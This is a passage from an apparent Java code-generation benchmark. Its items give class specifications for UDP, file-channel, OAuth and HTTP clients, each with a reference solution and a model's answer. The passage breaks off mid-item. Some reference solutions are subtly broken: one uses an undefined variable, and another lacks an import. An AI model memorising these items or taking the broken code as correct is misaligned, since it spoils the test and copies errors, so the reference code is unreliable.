    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.InetSocketAddress;\nimport java.util.Scanner;\n\npublic class DatagramChannelEchoClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .handler(new ChannelInitializer<NioDatagramChannel>() {\n                    @Override\n                    protected void initChannel(NioDatagramChannel ch) {\n                        ch.pipeline().addLast(new DatagramPacketHandler());\n                    }\n                });\n\n        channel = bootstrap.bind(0).sync().channel();\n        System.out.println(\"UDP client started on port: \" + ((InetSocketAddress) channel.localAddress()).getPort());\n    }\n\n    public void sendMessage(String message) {\n        channel.writeAndFlush(new DatagramPacket(\n                Unpooled.copiedBuffer(message, CharsetUtil.UTF_8),\n                new InetSocketAddress(host, port)));\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"Enter message to send (type 'exit' to quit): \");\n            String input = scanner.nextLine();\n            if (\"exit\".equalsIgnoreCase(input)) {\n                break;\n            }\n            sendMessage(input);\n        }\n        scanner.close();\n        stop();\n    }\n\n    private static class DatagramPacketHandler extends SimpleChannelInboundHandler<DatagramPacket> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket packet) {\n            String received = packet.content().toString(CharsetUtil.UTF_8);\n            System.out.println(\"Received from server: \" + received);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            DatagramChannelEchoClient client = new DatagramChannelEchoClient(\"127.0.0.1\", 8080);\n            client.start();\n            client.runConsoleInput();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a Java class that provides file processing capabilities using Java NIO's FileChannel for efficient file operations including memory-mapped file access and direct buffer reading.\n\nClass Description: FileChannelProcessor is a utility class that handles file operations using Java NIO's FileChannel. It supports memory-mapped file access (MappedByteBuffer) and direct buffer reading (ByteBuffer) with methods for opening/closing channels, mapping file segments, reading buffer segments, and finding line boundaries in buffers.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nfilePath: Path - The path to the file being processed\nMAX_LINE_LENGTH: int (static final) - Maximum expected line length for boundary finding\nMMAP_CHUNK_SIZE: int (static final) - Maximum size for memory-mapped file segments\n\nMethods:\nopenChannel: void() throws IOException - Opens a read-only FileChannel for the specified file path\nmapFileSegment: MappedByteBuffer(long start, long size) throws IOException - Maps a file segment into memory as a read-only MappedByteBuffer\nreadBufferSegment: ByteBuffer(long position, int length) throws IOException - Reads a file segment into a direct ByteBuffer\nfindLineBoundary: long(ByteBuffer buffer, long startPosition) - Finds the position of the next line boundary in a buffer\ncloseChannel: void() throws IOException - Closes the FileChannel if it's open\ngetFileSize: long() throws IOException - Returns the size of the file associated with the FileChannel",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private static final int MAX_LINE_LENGTH = 128;\n    private static final int MMAP_CHUNK_SIZE = Integer.MAX_VALUE / 32;\n\n    private FileChannel fileChannel;\n    private Path filePath;\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        this.fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        ByteBuffer buf = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buf, position);\n        return buf;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int w = MAX_LINE_LENGTH;\n        while (buffer.get(w - 1) != '\\n') {\n            w--;\n        }\n        return startPosition + w;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        return fileChannel.size();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private final Path filePath;\n    private FileChannel fileChannel;\n    public static final int MAX_LINE_LENGTH = 8192;\n    public static final int MMAP_CHUNK_SIZE = 1024 * 1024; // 1 MB\n\n    public FileChannelProcessor(Path filePath) {\n        this.filePath = filePath;\n    }\n\n    public void openChannel() throws IOException {\n        if (fileChannel == null || !fileChannel.isOpen()) {\n            fileChannel = FileChannel.open(filePath, StandardOpenOption.READ);\n        }\n    }\n\n    public MappedByteBuffer mapFileSegment(long start, long size) throws IOException {\n        if (start < 0 || size <= 0) {\n            throw new IllegalArgumentException(\"Invalid start or size for mapping\");\n        }\n        return fileChannel.map(FileChannel.MapMode.READ_ONLY, start, size);\n    }\n\n    public ByteBuffer readBufferSegment(long position, int length) throws IOException {\n        if (position < 0 || length <= 0) {\n            throw new IllegalArgumentException(\"Invalid position or length for reading\");\n        }\n        ByteBuffer buffer = ByteBuffer.allocateDirect(length);\n        fileChannel.read(buffer, position);\n        buffer.flip();\n        return buffer;\n    }\n\n    public long findLineBoundary(ByteBuffer buffer, long startPosition) {\n        int limit = buffer.limit();\n        for (int i = 0; i < limit; i++) {\n            if (buffer.get(i) == '\\n') {\n                return startPosition + i + 1;\n            }\n        }\n        return -1;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null && fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public long getFileSize() throws IOException {\n        if (!fileChannel.isOpen()) {\n            throw new IOException(\"FileChannel is not open.\");\n        }\n        return fileChannel.size();\n    }\n}\n```"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Implement a Java class that interacts with GitHub's OAuth API to obtain an access token and retrieve user information using the OkHttp library for HTTP requests.\n\nClass Description: The `GithubProvider` class handles authentication with GitHub's OAuth API. It provides methods to obtain an access token using authorization code and to fetch GitHub user information using the obtained access token.\n\nAttributes:\n- clientId: String - GitHub OAuth application client ID (injected from configuration)\n- clientSecret: String - GitHub OAuth application client secret (injected from configuration)\n- redirectUri: String - Redirect URI registered with GitHub OAuth application (injected from configuration)\n\nMethods:\n- getAccessToken(AccessTokenDTO accessTokenDTO) -> String - Obtains an access token from GitHub's OAuth API. Takes an AccessTokenDTO object containing authorization code and other parameters, sets client credentials, makes a POST request to GitHub's token endpoint, and returns the access token.\n- getUser(String accessToken) -> GithubUser - Retrieves GitHub user information using the provided access token. Makes a GET request to GitHub's user API endpoint with the access token in the Authorization header and returns the user data as a GithubUser object.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport life.majiang.community.dto.AccessTokenDTO;\nimport life.majiang.community.provider.dto.GithubUser;\nimport okhttp3.*;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class GithubProvider {\n\n    @Value(\"${github.client.id}\")\n    private String clientId;\n\n    @Value(\"${github.client.secret}\")\n    private String clientSecret;\n\n    @Value(\"${github.redirect.uri}\")\n    private String redirectUri;\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) {\n        accessTokenDTO.setClient_id(clientId);\n        accessTokenDTO.setClient_secret(clientSecret);\n        accessTokenDTO.setRedirect_uri(redirectUri);\n        MediaType mediaType = MediaType.get(\"application/json; charset=utf-8\");\n        OkHttpClient client = new OkHttpClient();\n\n        RequestBody body = RequestBody.create(mediaType, JSON.toJSONString(accessTokenDTO));\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(body)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            String string = response.body().string();\n            String token = string.split(\"&\")[0].split(\"=\")[1];\n            return token;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public GithubUser getUser(String accessToken) {\n        OkHttpClient client = new OkHttpClient();\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"token \" + accessToken)\n                .build();\n        try {\n            Response response = client.newCall(request).execute();\n            String string = response.body().string();\n            GithubUser githubUser = JSON.parseObject(string, GithubUser.class);\n            return githubUser;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class GithubProvider {\n    private final String clientId;\n    private final String clientSecret;\n    private final String redirectUri;\n    private final OkHttpClient httpClient;\n\n    public GithubProvider(String clientId, String clientSecret, String redirectUri) {\n        this.clientId = clientId;\n        this.clientSecret = clientSecret;\n        this.redirectUri = redirectUri;\n        this.httpClient = new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(10, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) throws IOException {\n        RequestBody formBody = new FormBody.Builder()\n                .add(\"client_id\", clientId)\n                .add(\"client_secret\", clientSecret)\n                .add(\"code\", accessTokenDTO.getCode())\n                .add(\"redirect_uri\", redirectUri)\n                .add(\"grant_type\", \"authorization_code\")\n                .build();\n\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(formBody)\n                .build();\n\n        try (Response response = httpClient.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            JSONObject json = new JSONObject(response.body().string());\n            return json.getString(\"access_token\");\n        }\n    }\n\n    public GithubUser getUser(String accessToken) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"token \" + accessToken)\n                .header(\"Accept\", \"application/vnd.github.v3+json\")\n                .get()\n                .build();\n\n        try (Response response = httpClient.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            JSONObject json = new JSONObject(response.body().string());\n            return new GithubUser(\n                    json.getString(\"login\"),\n                    json.getString(\"name\"),\n                    json.getString(\"email\"),\n                    json.getString(\"avatar_url\")\n            );\n        }\n    }\n}\n\nclass AccessTokenDTO {\n    private final String code;\n\n    public AccessTokenDTO(String code) {\n        this.code = code;\n    }\n\n    public String getCode() {\n        return code;\n    }\n}\n\nclass GithubUser {\n    private final String username;\n    private final String name;\n    private final String email;\n    private final String avatarUrl;\n\n    public GithubUser(String username, String name, String email, String avatarUrl) {\n        this.username = username;\n        this.name = name;\n        this.email = email;\n        this.avatarUrl = avatarUrl;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public String getAvatarUrl() {\n        return avatarUrl;\n    }\n}\n```"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for inter-process communication using HTTP, with support for handling both client and server errors, and token-based authentication.\n\nClass Description: The BeaconClient class is a RESTful HTTP client designed for inter-process communication. It handles HTTP requests and responses, manages authentication tokens, and provides error handling for both client-side (4xx) and server-side (5xx) errors. The class uses Java's HttpClient for communication and Jackson for JSON serialization/deserialization.\n\nAttributes:\n- port: int - The port number on which the server is running (localhost)\n- token: String - The authentication token used for Bearer token authorization (optional)\n\nMethods:\n- performRequest: <RES> performRequest(BeaconInterface<?> prov, String rawNode) -> RES - Sends an HTTP POST request to the specified path with the given content. Handles authentication and error responses. Returns the deserialized response object.\n- performRequest: <REQ, RES> performRequest(REQ req) -> RES - Converts the request object to JSON and sends it to the appropriate endpoint determined by the request type. Returns the deserialized response object.\n- parseClientError: Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) -> Optional<BeaconClientErrorResponse> - Parses and returns client error responses (4xx status codes) from the server.\n- parseServerError: Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) -> Optional<BeaconServerErrorResponse> - Parses and returns server error responses (5xx status codes) from the server.",
    "Canonical_solution": "import io.xpipe.beacon.api.HandshakeExchange;\nimport io.xpipe.core.util.JacksonMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Files;\nimport java.util.Optional;\n\npublic class BeaconClient {\n\n    private final int port;\n    private String token;\n\n    public BeaconClient(int port) {\n        this.port = port;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        var client = HttpClient.newHttpClient();\n        HttpResponse<String> response;\n        try {\n            var uri = URI.create(\"http://127.0.0.1:\" + port + prov.getPath());\n            var builder = HttpRequest.newBuilder();\n            if (token != null) {\n                builder.header(\"Authorization\", \"Bearer \" + token);\n            }\n            var httpRequest = builder.uri(uri)\n                    .POST(HttpRequest.BodyPublishers.ofString(content))\n                    .build();\n            response = client.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n        } catch (Exception ex) {\n            throw new BeaconConnectorException(\"Couldn't send request\", ex);\n        }\n\n        var se = parseServerError(response);\n        if (se.isPresent()) {\n            se.get().throwError();\n        }\n\n        var ce = parseClientError(response);\n        if (ce.isPresent()) {\n            throw ce.get().throwException();\n        }\n\n        try {\n            var reader = JacksonMapper.getDefault().readerFor(prov.getResponseClass());\n            var emptyResponseClass = prov.getResponseClass().getDeclaredFields().length == 0;\n            var body = response.body();\n            if (emptyResponseClass && body.isBlank()) {\n                return createDefaultResponse(prov);\n            }\n            var v = (RES) reader.readValue(body);\n            return v;\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse response\", ex);\n        }\n    }\n\n    public <REQ, RES> RES performRequest(REQ req)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        ObjectNode node = JacksonMapper.getDefault().valueToTree(req);\n        var prov = BeaconInterface.byRequest(req);\n        if (prov.isEmpty()) {\n            throw new IllegalArgumentException(\"Unknown request class \" + req.getClass());\n        }\n        return performRequest(prov.get(), node.toPrettyString());\n    }\n\n    private Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 400 || response.statusCode() > 499) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconClientErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n\n    private Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response)\n            throws BeaconConnectorException {\n        if (response.statusCode() < 500 || response.statusCode() > 599) {\n            return Optional.empty();\n        }\n        try {\n            var v = JacksonMapper.getDefault().readValue(response.body(), BeaconServerErrorResponse.class);\n            return Optional.of(v);\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse client error message\", ex);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Optional;\n\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class BeaconClient {\n    private final int port;\n    private final String token;\n    private final ObjectMapper mapper = new ObjectMapper();\n    private final HttpClient client = HttpClient.newHttpClient();\n\n    public BeaconClient(int port, String token) {\n        this.port = port;\n        this.token = token;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode) throws IOException, InterruptedException {\n        String endpoint = \"http://localhost:\" + port + \"/api/\" + URLEncoder.encode(rawNode, StandardCharsets.UTF_8);\n        String payload = mapper.writeValueAsString(prov);\n\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(endpoint))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + token)\n                .POST(HttpRequest.BodyPublishers.ofString(payload))\n                .build();\n\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 200 && response.statusCode() < 300) {\n            return mapper.readValue(response.body(), mapper.getTypeFactory().constructType(prov.getResponseClass()));\n        } else if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            Optional<BeaconClientErrorResponse> error = parseClientError(response);\n            if (error.isPresent()) {\n                throw new IOException(\"Client Error: \" + error.get().getMessage());\n            }\n        } else if (response.statusCode() >= 500 && response.statusCode() < 600) {\n            Optional<BeaconServerErrorResponse> error = parseServerError(response);\n            if (error.isPresent()) {\n                throw new IOException(\"Server Error: \" + error.get().getMessage());\n            }\n        }\n\n        throw new IOException(\"Unexpected status code: \" + response.statusCode());\n    }\n\n    public <REQ, RES> RES performRequest(REQ req) throws IOException, InterruptedException {\n        String endpoint = \"http://localhost:\" + port + \"/api/\" + req.getClass().getSimpleName().toLowerCase();\n        String payload = mapper.writeValueAsString(req);\n\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(endpoint))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + token)\n                .POST(HttpRequest.BodyPublishers.ofString(payload))\n                .build();\n\n        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 200 && response.statusCode() < 300) {\n            Class<RES> resClass = (Class<RES>) ((java.lang.reflect.ParameterizedType) req.getClass()\n                    .getGenericInterfaces()[0]).getActualTypeArguments()[1];\n            return mapper.readValue(response.body(), resClass);\n        } else if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            Optional<BeaconClientErrorResponse> error = parseClientError(response);\n            if (error.isPresent()) {\n                throw new IOException(\"Client Error: \" + error.get().getMessage());\n            }\n        } else if (response.statusCode() >= 500 && response.statusCode() < 600) {\n            Optional<BeaconServerErrorResponse> error = parseServerError(response);\n            if (error.isPresent()) {\n                throw new IOException(\"Server Error: \" + error.get().getMessage());\n            }\n        }\n\n        throw new IOException(\"Unexpected status code: \" + response.statusCode());\n    }\n\n    public Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) {\n        try {\n            return Optional.of(mapper.readValue(response.body(), BeaconClientErrorResponse.class));\n        } catch (JsonProcessingException e) {\n            return Optional.empty();\n        }\n    }\n\n    public Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) {\n        try {\n            return Optional.of(mapper.readValue(response.body(), BeaconServerErrorResponse.class));\n        } catch (JsonProcessingException e) {\n            return Optional.empty();\n        }\n    }\n}\n\nclass BeaconClientErrorResponse {\n    private String message;\n    private int code;\n\n    public String getMessage() {\n        return message;\n    }\n\n    public int getCode() {\n        return code;\n    }\n}\n\nclass BeaconServerErrorResponse {\n    private String message;\n    private String details;\n\n    public String getMessage() {\n        return message;\n    }\n\n    public String getDetails() {\n        return details;\n    }\n}\n\ninterface BeaconInterface<RES> {\n    Class<RES> getResponseClass();\n}\n```"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Create a Java class that provides HTTP client functionality for making POST requests and JSON requests to RESTful APIs, with support for both JSON and form-data payloads, and proper response handling.\n\nClass Description: The Network class is a utility class that encapsulates HTTP client operations for interacting with RESTful APIs. It provides methods for making POST requests with flexible parameter formats (JSON or form-data) and a specialized method for making requests that expect JSON responses.\n\nAttributes:\n\nhttpClient: [HttpClient] - A shared HTTP client instance used for all requests, initialized as a static final variable to ensure thread-safety and reuse.\n\nMethods:\n\nmakePOSTRequest: [Name](String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) -> [HttpResponse<String>] - Makes a POST request to the specified URL with the given parameters and headers. The convertParamtersToJSON flag determines whether parameters are sent as JSON or form-urlencoded data.\n\nbuildFormDataFromMap: [Name](Map<Object, Object> data) -> [HttpRequest.BodyPublisher] - A private helper method that converts a Map into form-urlencoded string format for POST requests.\n\nmakeJsonRequest: [Name](String url) -> [JsonElement] - Makes a GET request to the specified URL and parses the response as JSON, throwing an IOException if the request fails.\n\nfailure: [Name](int statusCode) -> [boolean] - A private helper method that checks if an HTTP status code indicates failure (outside 200-299 range).",
    "Canonical_solution": "import com.google.gson.Gson;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\npublic class Network {\n\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public static HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        Gson gson = new Gson();\n        String JSONParameters = gson.toJson(parameters);\n\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder(URI.create(url))\n                .POST(convertParamtersToJSON ? BodyPublishers.ofString(JSONParameters) : buildFormDataFromMap(parameters));\n\n        for (Map.Entry<String, String> entry : headers.entrySet())\n            requestBuilder.header(entry.getKey(), entry.getValue());\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private static HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        var builder = new StringBuilder();\n        for (Map.Entry<Object, Object> entry : data.entrySet()) {\n            if (builder.length() > 0) {\n                builder.append(\"&\");\n            }\n            builder.append(URLEncoder.encode(entry.getKey().toString(), StandardCharsets.UTF_8));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8));\n        }\n        return HttpRequest.BodyPublishers.ofString(builder.toString());\n    }\n\n    static JsonElement makeJsonRequest(String url) throws IOException {\n        try {\n            HttpResponse<InputStream> response = httpClient.send(HttpRequest.newBuilder(URI.create(url)).build(),\n                    HttpResponse.BodyHandlers.ofInputStream());\n            if (failure(response.statusCode())) {\n                throw new IOException(\"HTTP Response was \" + response);\n            }\n            return JsonParser.parseReader(new BufferedReader(new InputStreamReader(response.body())));\n        } catch (InterruptedException e) {\n            throw new IOException(e);\n        }\n    }\n\n    private static boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode > 299;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\nimport java.util.stream.Collectors;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\n\npublic class Network {\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .header(\"Content-Type\", convertParamtersToJSON ? \"application/json\" : \"application/x-www-form-urlencoded\")\n                .method(\"POST\", convertParamtersToJSON ? HttpRequest.BodyPublishers.ofString(generateJsonFromMap(parameters)) : buildFormDataFromMap(parameters));\n\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                requestBuilder.header(entry.getKey(), entry.getValue());\n            }\n        }\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        var formData = data.entrySet().stream()\n                .map(entry -> URLEncoder.encode(entry.getKey().toString(), StandardCharsets.UTF_8)\n                        + \"=\"\n                        + URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8))\n                .collect(Collectors.joining(\"&\"));\n\n        return HttpRequest.BodyPublishers.ofString(formData);\n    }\n\n    public JsonElement makeJsonRequest(String url) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .GET()\n                .build();\n\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (failure(response.statusCode())) {\n            throw new IOException(\"Request failed with status code: \" + response.statusCode());\n        }\n\n        return JsonParser.parseString(response.body());\n    }\n\n    private boolean failure(int statusCode) {\n        return !(statusCode >= 200 && statusCode < 300);\n    }\n\n    private String generateJsonFromMap(Map<Object, Object> map) {\n        StringBuilder json = new StringBuilder();\n        json.append(\"{\");\n        for (Map.Entry<Object, Object> entry : map.entrySet()) {\n            json.append(\"\\\"\").append(entry.getKey()).append(\"\\\":\\\"\");\n            json.append(entry.getValue()).append(\"\\\",\");\n        }\n        if (json.length() > 1) {\n            json.deleteCharAt(json.length() - 1);\n        }\n        json.append(\"}\");\n        return json.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using OkHttp library, supporting GET and POST methods with configurable headers, parameters, and retry mechanism.\n\nClass Description: HttpUtil is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests with support for headers, query parameters, and form parameters. The class includes built-in timeout settings and a retry mechanism for failed requests.\n\nAttributes:\n- QUESTION_SEPARATE: String - Constant for URL question mark separator\n- PARAM_SEPARATE: String - Constant for URL parameter separator\n- KV_SEPARATE: String - Constant for key-value separator in URLs\n- client: OkHttpClient - Pre-configured HTTP client instance with timeout settings\n\nMethods:\n- doGet(String url) -> Resp - Executes a GET request to the specified URL\n- doGetWithHeader(String url, Map<String, String> headers) -> Resp - Executes a GET request with custom headers\n- doGet(String url, Map<String, String> params) -> Resp - Executes a GET request with URL parameters\n- doPost(String url) -> Resp - Executes a POST request to the specified URL\n- doPost(String url, Map<String, String> params) -> Resp - Executes a POST request with form parameters\n- executeRequest(Request request, int retryTime) -> Resp - Internal method to execute requests with retry logic\n- bodyToString(ResponseBody body) -> String - Helper method to convert response body to string\n\nNested Class: Resp\n- Description: Represents the HTTP response with status code, body, and optional message\n- Attributes:\n  - code: int - HTTP status code\n  - body: String - Response body content\n  - message: String - Optional message (used for errors)\n- Methods:\n  - builder() -> RespBuilder - Creates a new RespBuilder instance\n  - getCode() -> int - Returns the status code\n  - getBody() -> String - Returns the response body\n  - getMessage() -> String - Returns the message\n\nNested Class: RespBuilder\n- Description: Builder pattern implementation for constructing Resp objects\n- Methods:\n  - code(int code) -> RespBuilder - Sets the status code\n  - body(String body) -> RespBuilder - Sets the response body\n  - message(String message) -> RespBuilder - Sets the message\n  - build() -> Resp - Constructs the Resp object",
    "Canonical_solution": "import okhttp3.*;\nimport org.apache.commons.collections4.MapUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpUtil {\n\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private static final OkHttpClient client = new OkHttpClient().newBuilder()\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().get().url(url).build());\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        final Request.Builder builder = new Request.Builder().get().url(url);\n        if (MapUtils.isNotEmpty(headers)) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build());\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder builder = new StringBuilder(url);\n        if (!StringUtils.contains(url, QUESTION_SEPARATE)) {\n            builder.append(QUESTION_SEPARATE).append(\"_r=1\");\n        }\n        if (MapUtils.isNotEmpty(params)) {\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                builder.append(PARAM_SEPARATE)\n                        .append(entry.getKey())\n                        .append(KV_SEPARATE)\n                        .append(entry.getValue());\n            }\n        }\n        return doGet(builder.toString());\n    }\n\n    public static Resp doPost(String url) {\n        return doPost(url, null);\n    }\n\n    public static Resp doPost(String url, Map<String, String> params) {\n        FormBody.Builder builder = new FormBody.Builder();\n        if 